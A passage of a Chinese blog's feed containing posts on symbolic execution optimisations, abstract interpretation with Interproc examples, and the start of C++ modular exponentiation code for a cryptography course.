H384z"/></svg></span></span><span style="top:-3.816em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.958em;"><span class="pstrut" style="height:3.816em;"></span><span style="height:1.816em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="1.816em" style="width:0.8889em" viewBox="0 0 888.89 1816" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V1816 H384z M384 0 H504 V1816 H384z"/></svg></span></span><span style="top:-6.766em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.851em;"><span style="top:-5.853em;"><span class="pstrut" style="height:3.01em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">10</span></span></span><span style="top:-4.413em;"><span class="pstrut" style="height:3.01em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">10</span></span></span><span style="top:-2.971em;"><span class="pstrut" style="height:3.01em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mathnormal mtight">a</span><span class="mbin mtight">+</span><span class="mord mtight">10</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">10</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-1.531em;"><span class="pstrut" style="height:3.01em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span><span style="top:-0.091em;"><span class="pstrut" style="height:3.01em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.351em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>或者</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>z</mi><mo>&gt;</mo><mn>0</mn><mtext>恒成立</mtext><mo stretchy="false">?</mo><mspace linebreak="newline"></mspace><mi>s</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi mathvariant="normal">.</mi><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>=</mo><mi>a</mi><mo>+</mo><mn>10</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>y</mi><mo>=</mo><mi>b</mi><mo>+</mo><mn>10</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>z</mi><mo>=</mo><mi>a</mi><mi mathvariant="normal">/</mi><mn>5</mn><mo>+</mo><mn>2</mn><mo>+</mo><mo stretchy="false">(</mo><mi>b</mi><mo>+</mo><mn>10</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>⩽</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>b</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">z&gt;0\text{恒成立}?\\s.t.\begin{cases}    x=a+10\\    y=b+10\\    z=a/5+2+(b+10)\\    a\leqslant 0\\    b&gt;0\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">0</span><span class="mord text"><span class="mord cjk_fallback">恒成立</span></span><span class="mclose">?</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:7.2em;vertical-align:-3.35em;"></span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-1.366em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.358em;"><span class="pstrut" style="height:3.816em;"></span><span style="height:1.816em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="1.816em" style="width:0.8889em" viewBox="0 0 888.89 1816" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V1816 H384z M384 0 H504 V1816 H384z"/></svg></span></span><span style="top:-3.816em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.958em;"><span class="pstrut" style="height:3.816em;"></span><span style="height:1.816em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="1.816em" style="width:0.8889em" viewBox="0 0 888.89 1816" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V1816 H384z M384 0 H504 V1816 H384z"/></svg></span></span><span style="top:-6.766em;"><span class="pstrut" style="height:3.816em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-5.85em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">10</span></span></span><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">10</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">a</span><span class="mord">/5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">10</span><span class="mclose">)</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span><span style="top:-0.09em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p></li></ol><h2 id="优化方法">优化方法</h2><p>符号执行很容易遇到路径爆炸的问题，就是路径太多、太长，求解就会非常慢。</p><ol><li>剪枝</li></ol><p>剪枝，是指在分支处调用约束求解的语句，如果约束直接冲突，那么就代表不可达。比较经典的办法是 Eager evaluation，在分支的时候就判断路径的可达性，虽然求解次数更多，但是探索的路径更少。但是上面示例中 Lazy evaluation，只对完整路径判断，也有自己的好处。约束越多，就越容易发生冲突，所以判断无解的速度也很快。</p><ol start="2"><li>从冲突学习</li></ol><p>可以通过之前的冲突判断不可达的条件。</p><h2 id="其他问题">其他问题</h2><p>数组处理很简单，read、write 两类操作，加入索引和值即可。</p><p>函数调用按着路径走即可，递归函数其实可以看成循环，设置同一个函数的最大调用深度即可。</p><p>指针和堆上变量的处理，区别主要在于不知道指针对象的结构，可以增加变量，对新建的变量、原有的变量分成多个分支。</p><h2 id="动态符号执行">动态符号执行</h2><p>之前的思路都是静态符号执行，动态符号执行在它的基础上，把某些符号值替换成实际值，然后也用具体的值选择路径。这样可以避免一些无法求解的情况。具体讲解例子可以看熊英飞老师的<a href="https://www.bilibili.com/video/BV1Rt4y1s7tC?t=3938.2&amp;p=19">课程</a>。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>（七）抽象解释</title>
    <link href="https://www.blog-blockchain.xyz/pl/abstract-interpretation/"/>
    <id>https://www.blog-blockchain.xyz/pl/abstract-interpretation/</id>
    <published>2022-12-07T03:09:33.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><h1>前言</h1><p>这一文章是理论课，对之前的程序分析的合理性和思路，进行了理论上的分析和论证，有助于读者培养程序分析的思维。程序分析的很多思路都是对具体的值具体的表达式进行了抽象，建立了具体空间和抽象空间的关系，抽象解释理论就是解释映射函数。</p><img src="http://cdn.blog-blockchain.xyz/202212022317576.png" alt="image-20221202231758487" style="zoom:50%;" /><p>这个映射主要分成两部分：</p><ol><li>具体化函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">\gamma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span></span></span></span> 将抽象值映射为具体值的集合</li><li>抽象化函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span> 将具体值的集合映射为抽象值</li></ol><h1>伽罗瓦连接 Galois Connection</h1><p>假设抽象域上存在<strong>偏序关系</strong>。简便起见，这里假设具体值集合上的偏序关系为子集关系。但抽象解释理论支持其他偏序关系，比如超集。</p><p>注意下面特殊的字 <code>虚</code> 表示抽象域集合，<code>甲</code> 表示抽象域集合中的元素。任取两个集合中各自一个元素 <code>X</code> 和 <code>甲</code>，那么如果满足如下的条件，就构成了伽罗瓦连接。</p><img src="http://cdn.blog-blockchain.xyz/202212022333312.png" alt="image-20221202233306233" style="zoom:50%;" /><p>除了上面的定义意外，还有更加详细的定义，他们可以更加容易的看出映射函数的性质。为了加快学习速度，我不详细说明证明过程了。这让我想起来《信息安全数学基础》，学了一堆近世代数的东西，可能我当时不知道有什么特别的用途吧，但是认真学习下来确实锻炼了抽象化的能力，去考虑性质和映射。</p><img src="http://cdn.blog-blockchain.xyz/202212022333033.png" alt="image-20221202233322974" style="zoom:50%;" /><h1>抽象域的安全性</h1><p>我们探讨，抽象域上的操作，是否对于具体域是安全的，也就是说，不会包含预料外的结果。<strong>安全性</strong> 其实一个比较灵活的词，根据不同的分析会有不同的含义，比如指针分析是 may 分析，允许有超出实际指向的情况的结果，它的安全性就是包括了所有可能指向的对象。但是对于编译器优化来说，它为了保证语义，它的安全性是，一定不会改变语义才是安全的，也就是 must 分析。</p><p>可以证明，一定可以找到合适的变化的函数。</p><img src="http://cdn.blog-blockchain.xyz/202212022349992.png" alt="image-20221202234911930" style="zoom:50%;" /><p>老师还以数据流分析的安全性为例，作了说明，后面还说明了路径的安全性。但是我暂时跳过了。感兴趣的读者可以见<a href="https://www.bilibili.com/video/BV1Rt4y1s7tC?t=2448.5&amp;p=11">视频</a>。</p><h1>常见抽象域</h1><h2 id="关系抽象">关系抽象</h2><p>考虑变量之间的关系映射到抽象域上，这里以数值计算为例。老师举了一个比较巧妙地例子「八边形抽象」，用于理解关系抽象的约束，可以更加精确地分析。<a href="https://www.bilibili.com/video/BV1Rt4y1s7tC?t=5301.4&amp;p=11">视频</a>讲的很清楚不赘述了。</p><p>下面是一个区间分析，虽然我也不记得 narrowing 和 widening 的具体规则了，但是可以感受到，添加了 <code>x+y</code> <code>x-y</code> 这样的约束，可以更加精确地表示出 <code>x</code> <code>y</code> 的范围。</p><img src="http://cdn.blog-blockchain.xyz/202212041317265.png" alt="image-20221204131725111" style="zoom:50%;" /><p>其他的数值抽象还有各种各样的图形，下面是比较简单的用平面图形就可以表示的情况，实际上高维的情况也是成立的，所以关系抽象是非常复杂但是应该也比较实用。</p><img src="http://cdn.blog-blockchain.xyz/202212041319076.png" alt="image-20221204131947017" style="zoom:80%;" /><h2 id="谓词抽象">谓词抽象</h2><p>这个比较容易理解，把一堆属性，用谓词产生对应的真值序列或者矩阵。比如 <code>x&gt;0,x=0,x&lt;0</code> 就可以抽象成 <code>[true,false,false]</code> 之类的。</p><h1>体验抽象解释工具</h1><p>最后，可以玩一玩这个抽象解释<a href="http://pop-art.inrialpes.fr/interproc/interprocweb.cgi">工具</a>，这是一个用于教育意义的 demo。他自己设置了一个简单的语言，比如它给的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">proc <span class="title function_">incr</span> <span class="params">(x:<span class="type">int</span>)</span> <span class="title function_">returns</span> <span class="params">(y:<span class="type">int</span>)</span></span><br><span class="line">begin</span><br><span class="line">  y = x+<span class="number">1</span>;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">var i:<span class="type">int</span>;</span><br><span class="line">begin</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i&lt;=<span class="number">10</span>) <span class="keyword">do</span></span><br><span class="line">    i = incr(i);</span><br><span class="line">  done;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>矩形抽象域（box）下的结果，可以知道 <code>incr</code> 里面 <code>x</code> 的范围，接着就知道了 <code>y</code> 的范围，进而就知道了返回值 <code>i</code> 的范围。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">proc <span class="title function_">incr</span> <span class="params">(x : <span class="type">int</span>)</span> <span class="title function_">returns</span> <span class="params">(y : <span class="type">int</span>)</span> var ;</span><br><span class="line">begin</span><br><span class="line">  <span class="comment">/* (L2 C5) [|x&gt;=0; -x+10&gt;=0|] */</span></span><br><span class="line">  y = x + <span class="number">1</span>; <span class="comment">/* (L3 C10)</span></span><br><span class="line"><span class="comment">                [|x&gt;=0; -x+10&gt;=0; y-1&gt;=0; -y+11&gt;=0|] */</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">var i : <span class="type">int</span>;</span><br><span class="line">begin</span><br><span class="line">  <span class="comment">/* (L7 C5) top */</span></span><br><span class="line">  i = <span class="number">0</span>; <span class="comment">/* (L8 C8) [|i&gt;=0; -i+11&gt;=0|] */</span></span><br><span class="line">  <span class="keyword">while</span> i &lt;= <span class="number">10</span> <span class="keyword">do</span></span><br><span class="line">    <span class="comment">/* (L9 C18) [|i&gt;=0; -i+10&gt;=0|] */</span></span><br><span class="line">    i = incr(i); <span class="comment">/* (L10 C16)</span></span><br><span class="line"><span class="comment">                    [|i-1&gt;=0; -i+11&gt;=0|] */</span></span><br><span class="line">  done; <span class="comment">/* (L11 C7) [|i-11=0|] */</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>八边形抽象域(octagon)，可以得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>±</mo><mi>x</mi><mo>+</mo><mo>±</mo><mi>y</mi><mo>≥</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">\pm x+\pm y \ge a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord">±</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord">±</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 的形式的约束，具体生成过程就不细究了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">proc <span class="title function_">incr</span> <span class="params">(x : <span class="type">int</span>)</span> <span class="title function_">returns</span> <span class="params">(y : <span class="type">int</span>)</span> var ;</span><br><span class="line">begin</span><br><span class="line">  <span class="comment">/* (L2 C5) [|x&gt;=0; -x+10&gt;=0|] */</span></span><br><span class="line">  y = x + <span class="number">1</span>; <span class="comment">/* (L3 C10)</span></span><br><span class="line"><span class="comment">                [|x&gt;=0; -x+10&gt;=0; -x+y-1&gt;=0; x+y-1&gt;=0; y-1&gt;=0; -x-y+21&gt;=0;</span></span><br><span class="line"><span class="comment">                  x-y+1&gt;=0; -y+11&gt;=0|] */</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">var i : <span class="type">int</span>;</span><br><span class="line">begin</span><br><span class="line">  <span class="comment">/* (L7 C5) top */</span></span><br><span class="line">  i = <span class="number">0</span>; <span class="comment">/* (L8 C8) [|i&gt;=0; -i+11&gt;=0|] */</span></span><br><span class="line">  <span class="keyword">while</span> i &lt;= <span class="number">10</span> <span class="keyword">do</span></span><br><span class="line">    <span class="comment">/* (L9 C18) [|i&gt;=0; -i+10&gt;=0|] */</span></span><br><span class="line">    i = incr(i); <span class="comment">/* (L10 C16)</span></span><br><span class="line"><span class="comment">                    [|i-1&gt;=0; -i+11&gt;=0|] */</span></span><br><span class="line">  done; <span class="comment">/* (L11 C7) [|i-11&gt;=0; -i+11&gt;=0|] */</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>信息安全算法基础</title>
    <link href="https://www.blog-blockchain.xyz/cs-courses/cpp-cryptographic-algorithm-basis/"/>
    <id>https://www.blog-blockchain.xyz/cs-courses/cpp-cryptographic-algorithm-basis/</id>
    <published>2022-12-02T08:15:22.000Z</published>
    <updated>2024-11-15T14:30:54.919Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/cs-courses/C-language-basis/" title="C语言基础">C语言基础</a></li><li><a href="/cs-courses/modular-inverses/" title="乘法逆元">乘法逆元</a></li><li><a href="/cs-courses/cpp-cryptographic-algorithm-basis/" title="信息安全算法基础">信息安全算法基础</a></li><li><a href="/cs-courses/OS/" title="操作系统基础">操作系统基础</a></li><li><a href="/cs-courses/x86-masm/" title="x86汇编基础">x86汇编基础</a></li><li><a href="/cs-courses/information-theory/" title="信息论与编码">信息论与编码</a></li></ol></blockquote><p>这篇文章是电子科技大学，计算机科学与工程学院，网络空间安全专业的《信息安全基础综合设计实验》的总结。本人将它视为复习总结，读者可以当作学习使用 C++ 编写密码学函数和使用密码学库的入门资料。由于包含了课程作业答案，所以明年的这个时候应该会隐藏文章。</p><h1>数论基础</h1><h2 id="模指数运算">模指数运算</h2><p>主要就是分治算法，避免计算过程中溢出。递归的写法要注意堆栈溢出，因为当 <code>e</code> 不等于 0 的时候，每一层递归都会有两个分叉，也就是 2^32 次方的话，就会有 2^32 次方分叉，程序非常慢。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">mod_exp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a,<span class="type">unsigned</span> <span class="type">int</span> e, <span class="type">unsigned</span> <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(e==<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(e%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">mod_exp</span>(a,e/<span class="number">2</span>,n)%n*(<span class="built_in">mod_exp</span>(a,e/<span class="number">2</span>,n)%n)%n;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">mod_exp</span>(a,e/<span class="number">2</span>,n)%n *(<span class="built_in">mod_exp</span>(a,e/<span class="number">2</span>,n)%n)%n*(a%n)%n;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么还是采用 power 函数，那么就只有线性复杂度了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">mod_exp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a,<span class="type">unsigned</span> <span class="type">int</span> e, <span class="type">unsigned</span> <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(e==<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 